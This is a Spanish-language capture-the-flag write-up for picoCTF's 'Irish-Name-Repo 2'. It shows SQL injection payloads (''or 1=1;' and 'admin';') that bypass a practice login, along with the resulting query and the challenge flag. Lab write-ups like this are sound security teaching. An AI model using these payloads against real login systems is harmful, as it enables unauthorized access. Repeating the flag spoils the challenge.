# Irish-Name-Repo 2


## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649

## Pistas
- The password is being filtered.

## Solución


- Entramos a la pagina web: [link](https://jupiter.challenges.picoctf.org/problem/33850/)  
- Se intenta entrar con un usuario y una contraseña cualquiera pero nos Manda un "Error de inicio de sesion", lo cual quiere decir no podemos entrar a encntrar la bandera.
- Para poder encontrar la bandera hacemos uso de SQL Injection.
- Dando click derecho en la pagina web seleccionamos la opción "Inspeccionar", nos abre el código funte donde borramos el hidden de una linea del código fuente esto nos permite poner un 1 en el login para poder entrar.
- Despues de haber ingresado el 1 procedemos a utilizar la Inyección "'or 1=1;" como usuario para poder encontrar la contraseña:
``` bash
username: 'or 1=1;
password: karen
SQL query: SELECT * FROM users WHERE name=''or 1=1;' AND password='karen'

SQLi detected.
```

- Al utilizar "'or 1=1;" como inyección detecta que estamos utilzando SQL Injection.

- Para poder encontrar la bandera tenemos que hacer uso de otra técnica de inyección:
``` bash
username: admin';
password: karen
SQL query: SELECT * FROM users WHERE name='admin';' AND password='karen'

Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_aee925db}
```

## Bandera
picoCTF{m0R3_SQL_plz_aee925db}

## Referencias
- [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)



